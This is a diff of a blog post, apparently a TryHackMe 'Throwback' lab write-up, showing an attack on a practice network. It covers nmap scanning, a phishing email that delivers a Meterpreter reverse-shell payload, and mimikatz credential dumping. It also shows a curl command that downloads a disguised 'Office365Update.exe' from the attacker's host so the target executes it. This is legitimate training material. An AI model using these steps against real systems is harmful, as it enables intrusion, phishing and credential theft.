@@ -8,24 +8,22 @@ The Throwback network on [Tryhackme](https://tryhackme.com/room/throwback) simul
 
 ## The lay of the land
 
-At first you only see some of the machine and they are added to the network diagram as you discovered them. I'll show you what the entirely discovered network looks like:
+At first you only see some of the boxes and more are added to the network diagram as you progress. I'll show you what the entirely discovered network looks like:
 
 ![Throwback network diagram](/github-pages-with-jekyll/assets/images/tb-network-diagram.png)\
 Figure 1: The Throwback network diagram
 
-So let's begin by running nmap:
+Let's VPN into the network and run nmap:
 
 ````
 nmap -sV -sC -p- -vv 10.200.19.0/24 --min-rate 5000 -oN firstScan
 ````
 
-If you are not familiar with nmap, I would recommand that you keep using those flags until you know better.
+sV and sC are very useful flags as they will try to identify services listening at port and will also some scripts to gather additional information about the host. I also asked for extra verbosity but it might have been a overkill in that situation. Here's a recap of some interesting findings by nmap:
 
-If you don't want to read the output I've made a recap:
-
-- A pfsense firewall running on 10.200.19.138 that's also hosting a website. Might be worth investigating...
+- A pfsense firewall running on 10.200.19.138 that's also hosting a website.
 - A linux box on 10.200.19.177 that is listening on port 1337 (the elite port) which seems to be hosting a website but since it’s not on the tryhackme network diagram I considered it was out of scope.
-- A windows machine on 10.200.19.219 that is hosting the company website, some smb services, remote desktop connection and more. Apparently it’s also disclosing a domain name: throwback.local.
+- A windows machine on 10.200.19.219 that is hosting the company website, SMB services, a remote desktop connection and more. Apparently it’s also disclosing a domain name: THROWBACK.
 - A linux box on 10.200.19.232 that's hosting a PHP Squirrel mail server.
 
 ````
@@ -252,17 +250,17 @@ PORT    STATE SERVICE  REASON  VERSION
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ````
 
-Next let's take a look at the company website. There is some employees photos and job title, always fun to see who's behind the username we will encounter. There is also email contacts that could be useful but we will getting a lot more of them in the next section. At the bottom of the site there is link to Linkedin and Twitter account which we could visit eventually.
+Next let's take a look at the company website. There is some employees photos and job title, always fun to see who's behind the username we might encounter. There is also email contacts that could be useful but we will getting a lot more of them in the next section. At the bottom of the site there is link to Linkedin and Twitter account which would be a good start for OSINT.
 
 ![Throwback hacks website](/github-pages-with-jekyll/assets/images/tb-hacks-website.png)\
 Figure 2: Throwback Hacks website
 
-Before we go any further I'll show you a slightly different network diagram notice that will help me illustrate the path I took through the network. On the diagram you can see my laptop which has VPN connection to the network, I’ll use the IP that correspond to tun0 (you can see that IP using ifconfig). The network I'm in is 10.200.19.0/24 but yours maybe different i.e. 10.200.x.0/24.
+Before we go any further I'll show you a slightly different network diagram notice that will help me illustrate the path I took through the network. On the diagram you can see my laptop which has VPN connection to the network. I will use the IP that correspond to tun0 (you can see that address ifconfig) when I set up reverse shell and such. The network I'm in is 10.200.19.0/24 but yours maybe different.
 
 ![Throwback hacks website](/github-pages-with-jekyll/assets/images/tb-network-diagram2.png)\
 Figure 3: Network diagram from my perspective
 
-There is multiple path to reach the Throwback domain but I will use an easy and fast way: the phishing campaign.
+There is multiple path to reach the Throwback domain but I will use an easy and fast way: a phishing attack.
 
 ## Gone phishing
 
@@ -279,7 +277,7 @@ sudo msfconsole
 > use exploit/multi/handler
 ````
 
-You can type _options_ to see parameters used by the current module and _set_ to modify them. There is also the command save that remembers what parameters you set so you won't have to set them everytime. So it should look like this:
+You can type _options_ to see parameters used by the current module and _set_ to modify them. So it should look like this:
 
 ````
 > options
@@ -292,25 +290,26 @@ Payload options (windows/meterpreter/reverse_tcp):
    LPORT     53               yes       The listen port
 ````
 
-To start the handler in the background: _exploit -j_
+You can keep the values of your parameters you set using _save_. To start the handler in the background: _exploit -j_
 
 Now let’s take a look the Throwback-MAIL website.
 
 ![Throwback hacks website](/github-pages-with-jekyll/assets/images/tb-mail.png)\
 Figure 4: Throwback mail website
 
-Conveniently, there is a guest account. Log in and you'll see that you have access to the address book. Send everyone an email, urging them to execute your payload:
+Conveniently, there is a guest account. Log in and you'll see that you have access to an address book. Send everyone an email, urging them to execute your payload:
 
   ![Throwback hacks website](/github-pages-with-jekyll/assets/images/phishing-email.png)\
 Figure 4: A suspicious mail from IT
 
-## All the cool kids love Metasploit (and mimikatz)
+## All the cool kids love Metasploit
 
 In less then a minute I received a meterpreter shell. Let see what kind of session we are in using the following commands:
 
 ````
 meterpreter> getuid                      
 Server username: THROWBACK-WS01\BlaireJ    
+
 meterpreter > sysinfo                                                                              
 Computer: THROWBACK-WS01                                                                   
 OS              : Windows 10 (10.0 Build 19041).                                                   
@@ -331,29 +330,24 @@ meterpreter > ps
 meterpreter > migrate 2112
 ````
 
-So I checked out _sysinfo_ again and I’m now in a x64 meterpreter shell and _getuid_ indicate that I’m now running as system. So I’m gonna load kiwi (previously known as mimikatz) and try to dump some credentials. If you never heard about mimikatz, it’s a very useful post exploitation tools that allows, among other things, to gather credentials on a windows machine:
+So I checked out _sysinfo_ again and I’m now in a x64 meterpreter shell and _getuid_ indicate that I’m now running as SYSTEM. So I’m gonna load kiwi (previously known as mimikatz) and try to dump some credentials. If you never heard about mimikatz, it’s a very useful post exploitation tools that allows, among other things, to gather credentials on a windows machine:
 ````
 meterpreter > load kiwi
 meterpreter > help kiwi
-````
-
-I tried a couple of kiwi commands and I tought I was in a dead end until I tried:
-
-````
-meterpreter > lsa_dump_secret:
+...
+meterpreter > lsa_dump_secret
 …
 Secret  : DefaultPassword
 old/text: ******** (here you should see the password but tryhackme doesn't allows showing password in writeups)
 ````
 
-It seems that Windows keep password of the user in DefaultPassword registry in some cases, like if remote desktop autologon is enabled. It is only accessible via SYSTEM permission but we got that when we migrated process. I have some Microsoft reference and that section also applies to Windows 10:
-[Microsoft Cached and Stored Credentials Overview: LSA](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/hh994565(v=ws.11)#lsass-process-memory)
+It seems that Windows keep plain text password of the user in DefaultPassword registry in some cases, like if remote desktop autologon is enabled. It is only accessible via SYSTEM permission but we got that when we migrated process. 
 
- So I managed to get a domain user password which I will use to set up my foothold on the Throwback-Prod machine. In the last sections we will set up the proxychains which will allow us to run command from our laptop as if we were launching them from Throwback-Prod.
+ So I managed to get a domain user password which I will use to set up my foothold on the Throwback-Prod machine. In the last sections we will set up the proxychains which will allow us to run command from our laptop as if we were launching them from Throwback-Prod which is inside the domain.
 
 ## Setting up the chains
 
-To set up the proxy, we need a meterpreter session. So back in metasploit, launch the handler again. We will use the payload we crafted earlier, after all we want everyone to benefits from our "update". In the folder you have the payload, we will serve the file with a python server:
+To set up the proxy, we need a meterpreter session. So back in metasploit, launch the handler again. We will make our payload we crafted earlier available through a python server:
 
 ````
 python3 -m http.server
@@ -365,7 +359,7 @@ Then ssh into Throwback-PROD since we now have his password:
 ssh blairej@10.200.19.219
 ````
 
-Use curl to grab the payload and execute it to get a meterpreter session (remember the ip is the same as tun0 so it will be different for you)
+Use curl to grab our little "update" and execute it to get a meterpreter session (remember the ip is the same as tun0 so it will be different for you):
 
 ````
 curl 10.50.17.38:8000/Office365Update.exe --output Office365Update.exe
@@ -423,6 +417,6 @@ This post was only a brief introduction to the Throwback network. If you hack th
 
  The hardest part for me was pivoting around the network and it's not over yet, rembember you still have to access the corporate domain. There is plenty of fun stuff you still have to see: bloodhound, kerberoasting, OSINT and even crafting an excel file with a malicious macro inside.
 
- Finally, I'll just give you a quick hint if you have difficulty entering the last domain. I had difficulty setting up my proxychains for it and my ssh connection were refused. So I used the previous proxychains with xfreedrdp to connect to Throwback-DC01 and then I used Windows Remote Desktop to connect to Corporate DC01. Might not be the most elegant way but it worked!
+ Finally, I'll just give you a quick hint if you have difficulty entering the last domain. I had some troubles setting up my proxychains for it and my ssh connection were refused. So I used the previous proxychains with xfreedrdp to connect to Throwback-DC01 and then I used Windows Remote Desktop to connect to Corporate DC01.
 
- I still have lots to learn about network pentesting and pivoting and I'd like to have another go with this network once I have more experience. Have a good time hacking those networks and strive to make the internet a safer place!
+ I still have lots to learn about pivoting and I felt my grip was loosening as I went deeper into the network. Network segmentation adds another layer of security and help protect those assets. Have a good time hacking networks and always strive to make the internet a safer place.
